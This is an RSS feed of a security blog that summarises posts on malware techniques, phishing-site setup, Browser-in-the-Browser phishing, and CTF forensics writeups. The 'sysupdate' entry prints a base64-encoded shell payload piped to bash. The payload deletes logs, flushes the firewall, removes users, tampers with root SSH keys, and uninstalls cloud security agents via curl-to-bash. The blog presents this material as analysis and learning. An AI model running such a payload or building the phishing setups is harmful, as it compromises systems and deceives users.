<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Journal of Connar</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on Journal of Connar</description>
    <generator>Hugo -- 0.123.8</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 06 Jun 2024 20:03:02 +0200</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>API Hashing - Extensive breakdown</title>
      <link>http://localhost:1313/posts/apihashing/</link>
      <pubDate>Thu, 06 Jun 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/apihashing/</guid>
      <description>Intro As mentioned in the Exploring PEB struct and its fields post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value.</description>
    </item>
    <item>
      <title>Exploring PEB struct and its fields</title>
      <link>http://localhost:1313/posts/peb/</link>
      <pubDate>Sat, 11 May 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/peb/</guid>
      <description>Intro This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)
Special thanks to him cause he is basically teaching me 70% of this stuff lol.
So in this post, we will dive into:</description>
    </item>
    <item>
      <title>Browser-in-the-Browser (BitB) attack</title>
      <link>http://localhost:1313/posts/bitb/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/bitb/</guid>
      <description>What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.
Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.</description>
    </item>
    <item>
      <title>Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com </title>
      <link>http://localhost:1313/posts/batchencryption/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/batchencryption/</guid>
      <description>What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (&amp;quot;&amp;rsquo;&amp;quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.</description>
    </item>
    <item>
      <title>Exploring the Jlaive and UnJlaive tool</title>
      <link>http://localhost:1313/posts/jlaive/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/jlaive/</guid>
      <description>What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.</description>
    </item>
    <item>
      <title>Exploring the pCraft tool</title>
      <link>http://localhost:1313/posts/pcraft/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/pcraft/</guid>
      <description>What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.
Installation To install the tool, you can either clone it from its github repo:
https://github.com/DevoInc/pCraft or by using docker.
I had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.</description>
    </item>
    <item>
      <title>Learning about Windows API</title>
      <link>http://localhost:1313/posts/windowsapi/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/windowsapi/</guid>
      <description>Intro As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.
Was exactly is an API When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API.</description>
    </item>
    <item>
      <title>Setting up a phishing site [using blackeye tool]</title>
      <link>http://localhost:1313/posts/phishingsite/</link>
      <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
      <guid>http://localhost:1313/posts/phishingsite/</guid>
      <description>Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).
There are plenty of tools out there to quickly set up a phishing website. For example:
Socialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.
I just happened to be reading something about Blackeye tool, so we&amp;rsquo;ll go with this option.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/posts/insideapefile/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/insideapefile/</guid>
      <description></description>
    </item>
    <item>
      <title>About</title>
      <link>http://localhost:1313/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/about/</guid>
      <description>about</description>
    </item>
    <item>
      <title>An email from aunt Chloe - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/anemailfromauntchloe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/anemailfromauntchloe/</guid>
      <description>Starting the analysis In this challenge we are provided with a .rar file. We can extract the following files from this archive:
An image named “SantasVillage.png” A txt named “RecipeForClassicBreadStuffing.txt” If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code: What this script is doing is:
Open a website with recipe instructions.</description>
    </item>
    <item>
      <title>Ancient Cave Vault - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/ancientcavevault/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/ancientcavevault/</guid>
      <description>This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:
After the final wrong attempt, the executable closes:
So how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .</description>
    </item>
    <item>
      <title>Another malicious doc - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</guid>
      <description>Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:
Avoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:
One way we can deobfuscate this is utilizing the ChatGPT AI service:
Just by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.</description>
    </item>
    <item>
      <title>captcha 4 humans - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/captcha4humans/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/captcha4humans/</guid>
      <description>For this challenge you would normally fire up a docker instance that unfortunately you can&amp;rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!
The concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string.</description>
    </item>
    <item>
      <title>Chinese Windows Updater - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</guid>
      <description>Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:
Moreover, the memory dump alone does not yield any useful insights.
Therefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:
Upon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.</description>
    </item>
    <item>
      <title>Flag on the run - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/flagontherun/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/flagontherun/</guid>
      <description>Unzipping the provided file, we extract the following files:
This time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:
So we will ignore this for now and open the provided “.pcap” file with Wireshark:
This time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols.</description>
    </item>
    <item>
      <title>Headstream - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/headstream/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/headstream/</guid>
      <description>We&amp;rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named &amp;ldquo;GTAVI.exe&amp;rdquo;.
Upon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:
And after clicking the &amp;lsquo;OK&amp;rsquo; button:
Since we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool.</description>
    </item>
    <item>
      <title>Hinting flags - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/hintingflags/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/hintingflags/</guid>
      <description>Extracting the contents of the zip file, we are met with a &amp;ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:
Volatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.</description>
    </item>
    <item>
      <title>Insider - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/insider/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/insider/</guid>
      <description>The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale. So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:
A google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.</description>
    </item>
    <item>
      <title>IRS went phishing - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/irswentphishing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/irswentphishing/</guid>
      <description>We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.
The goldfynch is the easier option so that’s what we are going to use:
Opening the email, we view what seems to be a very sus message from presumably the IRS:
An archive is provided to the victim with a password set to recover the form.</description>
    </item>
    <item>
      <title>Malware Carving - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/malwarecarving/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/malwarecarving/</guid>
      <description>We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:
Pagefile.sys is a system file in Windows set aside for your computer&amp;#39;s Random Access Memory (RAM), also known as physical memory. When your computer&amp;#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn&amp;#39;t need, such as files and apps.</description>
    </item>
    <item>
      <title>Mr Anderson - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/mranderson/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/mranderson/</guid>
      <description>This is a writeup for the babufscation challenge This challenge gives us a zip file containing 3 pcap files:
What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.</description>
    </item>
    <item>
      <title>Mr Beast Xmas Giveaway - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/xmasgiveaway/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/xmasgiveaway/</guid>
      <description>Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.
Opening the file with Wireshark, we can view all the requests.
The request that is of interest is the one made to themrbeas7.org and is the following:
GET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.</description>
    </item>
    <item>
      <title>My Challenges</title>
      <link>http://localhost:1313/mychallenges/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/mychallenges/</guid>
      <description>my challenges</description>
    </item>
    <item>
      <title>Projects</title>
      <link>http://localhost:1313/projects/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/projects/</guid>
      <description>projects</description>
    </item>
    <item>
      <title>Showerpell - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/showerpell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/showerpell/</guid>
      <description>In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named &amp;ldquo;dnsexfil.ps1&amp;rdquo;. Using the option File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP.
With the help of a text editor, we can open this powershell script and view its contents:</description>
    </item>
    <item>
      <title>Sloppy Encryptor - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/sloppyencryptor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/sloppyencryptor/</guid>
      <description>This is a writeup for the sloppy encryptor challenge We are given an encrypted file containing unreadable text and the file used to produce it.
The encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii &amp;#39;&amp;#39;&amp;#39; The file that created it is: &amp;#39;&amp;#39;&amp;#39; from random import randint as rint from secret_stuff import FLAG def encrypt(FLAG): return &amp;#34;&amp;#34;.join([str(ord(c))+str(rint(126, 254)) for c in FLAG]) def toBytes(enc): return &amp;#34;&amp;#34;.join([chr(int(enc[i])+100) for i in range(len(enc))]) with open(&amp;#34;./flag.enc&amp;#34;,&amp;#34;w&amp;#34;) as f: enc = encrypt(FLAG) enc_ = toBytes(enc) f.</description>
    </item>
    <item>
      <title>sysupdate - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/sysupdate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/sysupdate/</guid>
      <description>In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:
echo -n &amp;#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&amp;#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.
Let&amp;rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it.</description>
    </item>
    <item>
      <title>Upgrading Windows - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/upgradingwindows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/upgradingwindows/</guid>
      <description>In this test, we are given a &amp;ldquo;.cmd&amp;rdquo; script whose purpose is to upgrade the user&amp;rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&amp;rsquo;s analyze the file to see what we can find.
We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution.</description>
    </item>
    <item>
      <title>Weak Legacy - Writeup</title>
      <link>http://localhost:1313/ctfwriteups/weaklegacy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ctfwriteups/weaklegacy/</guid>
      <description>Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.
Pcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:
We can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged.</description>
    </item>
  </channel>
</rss>
